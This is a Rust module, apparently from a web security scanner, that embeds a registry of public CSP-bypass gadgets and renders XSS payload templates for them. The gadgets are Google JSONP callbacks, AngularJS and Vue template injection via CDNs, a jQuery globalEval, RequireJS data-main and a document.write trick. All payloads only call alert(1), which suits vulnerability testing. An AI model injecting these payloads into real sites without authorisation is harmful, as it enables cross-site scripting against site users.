//! Embedded script-gadget / JSONP database for CSP bypass payload generation.
//!
//! Replaces the former hand-rolled six-branch CDN allowlist in
//! [`crate::payload::xss_csp_bypass`] with a single, extensible registry of
//! well-known public CSP-bypass gadgets (JSONBee / cure53 H5SC / Google CSP
//! Evaluator research). Two consumers read it:
//!
//! * **host-allowlist CSP** (no `strict-dynamic`): when `script-src` whitelists
//!   a host, a JSONP endpoint or framework script-gadget served from that host
//!   runs attacker JavaScript. [`gadgets_for_host`] returns the gadgets whose
//!   host pattern matches an allowed origin.
//! * **`strict-dynamic` CSP**: host allowlists are *ignored* by the browser, so
//!   a plain `<script src=allowed-host>` no longer loads. The bypass survives
//!   only through a *trusted* script that itself DOM-creates a new script
//!   (`document.write` / `createElement('script')` / a loader like RequireJS or
//!   AngularJS bootstrap). [`strict_dynamic_gadgets`] returns those DOM
//!   script-gadget shapes.
//!
//! Keeping host-allowlist and strict-dynamic gadgets in one table (each entry
//! flagged with `strict_dynamic`) means a single curated source of truth, and
//! lets the payload generator emit only the gadgets that can actually fire for
//! the observed CSP shape — so request volume never grows for CSPs the gadget
//! can't bypass.

/// A single CSP-bypass script gadget.
#[derive(Debug, Clone, Copy)]
pub struct ScriptGadget {
    /// Lowercase host substrings that make this gadget reachable when present in
    /// a `script-src` host allowlist. Matched with `allowed_origin.contains(p)`,
    /// so a bare host (`code.jquery.com`) or a brand fragment (`jquery`) both
    /// work. Empty for pure DOM gadgets that don't depend on a whitelisted host.
    pub host_patterns: &'static [&'static str],
    /// `true` when the gadget still fires under `strict-dynamic` — i.e. it works
    /// by getting a *trusted* script to create the attacker script in the DOM,
    /// not by a host-allowlisted `<script src>` load (which `strict-dynamic`
    /// blocks). Such gadgets are emitted in the strict-dynamic branch regardless
    /// of the (ignored) host allowlist.
    pub strict_dynamic: bool,
    /// Injection payload template. `{CLASS}` / `{ID}` are replaced with the
    /// per-scan reflection markers so the verification stage can positively
    /// identify its own element.
    pub template: &'static str,
    /// Short human-readable label naming the gadget.
    pub label: &'static str,
}

/// The embedded gadget registry. All entries are public, well-documented CSP
/// bypass primitives; none reach out to attacker infrastructure on their own.
static GADGETS: &[ScriptGadget] = &[
    // --- Google / Gstatic ---------------------------------------------------
    ScriptGadget {
        host_patterns: &["googleapis.com", "google.com", "gstatic.com"],
        strict_dynamic: false,
        template: "<script src=\"https://www.google.com/complete/search?client=chrome&q=xss&callback=alert\" class={CLASS}></script>",
        label: "Google complete/search JSONP callback",
    },
    ScriptGadget {
        host_patterns: &["accounts.google.com", "apis.google.com", "google.com"],
        strict_dynamic: false,
        template: "<script src=\"https://accounts.google.com/o/oauth2/revoke?callback=alert(1)\" class={CLASS}></script>",
        label: "Google oauth2 revoke JSONP callback",
    },
    // --- AngularJS (template-injection gadget, also fires under strict-dynamic
    //     once a trusted script bootstraps Angular which creates <script>s) ---
    ScriptGadget {
        host_patterns: &["angularjs.org", "angular", "cdnjs.cloudflare.com"],
        strict_dynamic: true,
        template: "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js\" class={CLASS}></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>",
        label: "AngularJS 1.x ng-csp $eval gadget (cdnjs)",
    },
    ScriptGadget {
        host_patterns: &["ajax.googleapis.com", "googleapis.com"],
        strict_dynamic: true,
        template: "<script src=\"https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js\" class={CLASS}></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>",
        label: "AngularJS 1.x ng-csp $eval gadget (Google CDN)",
    },
    // --- jQuery -------------------------------------------------------------
    ScriptGadget {
        host_patterns: &["jquery", "code.jquery.com"],
        strict_dynamic: false,
        template: "<script src=\"https://code.jquery.com/jquery-3.6.0.min.js\" class={CLASS}></script><img src=x onerror=$.globalEval('alert(1)')>",
        label: "jQuery globalEval gadget",
    },
    ScriptGadget {
        host_patterns: &["jquery", "ajax.googleapis.com"],
        strict_dynamic: false,
        template: "<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js\" class={CLASS}></script><div data-ng-jq class={ID}>{{}}</div>",
        label: "jQuery on Google CDN",
    },
    // --- jsDelivr / unpkg (universal npm gadget) ----------------------------
    ScriptGadget {
        host_patterns: &["unpkg.com", "jsdelivr.net"],
        strict_dynamic: true,
        template: "<script src=\"https://cdn.jsdelivr.net/npm/angular@1.6.0/angular.min.js\" class={CLASS}></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>",
        label: "AngularJS via jsDelivr/unpkg npm mirror",
    },
    ScriptGadget {
        host_patterns: &["unpkg.com", "jsdelivr.net"],
        strict_dynamic: false,
        template: "<script src=\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.min.js\" class={CLASS}></script><div id=app class={ID}>{{constructor.constructor('alert(1)')()}}</div>",
        label: "Vue 2 template-injection gadget via jsDelivr/unpkg",
    },
    // --- RequireJS data-main (canonical strict-dynamic DOM gadget) ----------
    ScriptGadget {
        host_patterns: &[
            "requirejs.org",
            "cdnjs.cloudflare.com",
            "jsdelivr.net",
            "unpkg.com",
        ],
        strict_dynamic: true,
        template: "<script data-main=\"data:text/javascript,alert(1)//{ID}\" src=\"https://cdnjs.cloudflare.com/ajax/libs/require.js/2.3.6/require.min.js\" class={CLASS}></script>",
        label: "RequireJS data-main loader gadget",
    },
    // --- Generic DOM script-gadget (document.write reflection) --------------
    ScriptGadget {
        host_patterns: &[],
        strict_dynamic: true,
        template: "<script class={CLASS}>document.write('<scr'+'ipt src=data:text/javascript,alert(1)//{ID}></scr'+'ipt>')</script>",
        label: "document.write self-propagating script gadget",
    },
];

/// All registered gadgets.
pub fn all() -> &'static [ScriptGadget] {
    GADGETS
}

/// Gadgets reachable when `allowed_origin` (a value from a `script-src` host
/// allowlist) is present. Used for CSPs *without* `strict-dynamic`, where a
/// whitelisted host genuinely permits loading a `<script src>` from it.
pub fn gadgets_for_host(allowed_origin: &str) -> impl Iterator<Item = &'static ScriptGadget> {
    let lowered = allowed_origin.to_ascii_lowercase();
    let host = extract_host(&lowered).to_string();
    GADGETS.iter().filter(move |g| {
        !g.host_patterns.is_empty() && g.host_patterns.iter().any(|p| host_matches(&host, p))
    })
}

/// Extract the bare host from a CSP `script-src` source value: strips the
/// scheme (`https://` or a leading `//`), any path/query/fragment, the port,
/// and a leading `*.` wildcard label. Input is expected already lowercased.
fn extract_host(origin: &str) -> &str {
    let s = origin
        .split_once("://")
        .map(|(_, rest)| rest)
        .unwrap_or(origin);
    let s = s.strip_prefix("//").unwrap_or(s);
    let s = s.split(['/', '?', '#']).next().unwrap_or(s);
    let s = s.split(':').next().unwrap_or(s);
    s.strip_prefix("*.").unwrap_or(s)
}

/// Match an allowlisted `host` against a gadget host pattern. A dotted pattern
/// (a full domain like `googleapis.com`) is matched on a domain boundary — the
/// host must equal it or be a subdomain — so `notgoogle.com` no longer matches
/// `google.com`. A bare fragment (`jquery`, `angular`) keeps loose substring
/// matching, since those intentionally catch any host serving that library.
fn host_matches(host: &str, pattern: &str) -> bool {
    if pattern.contains('.') {
        host == pattern || host.ends_with(&format!(".{pattern}"))
    } else {
        host.contains(pattern)
    }
}

/// Gadgets that survive `strict-dynamic` — DOM script-gadgets that get a trusted
/// script to create the attacker script, independent of the (ignored) host
/// allowlist.
pub fn strict_dynamic_gadgets() -> impl Iterator<Item = &'static ScriptGadget> {
    GADGETS.iter().filter(|g| g.strict_dynamic)
}

/// Render a gadget template, substituting the reflection markers.
pub fn render(template: &str, class_marker: &str, id_marker: &str) -> String {
    template
        .replace("{CLASS}", class_marker)
        .replace("{ID}", id_marker)
}

#[cfg(test)]
mod tests;
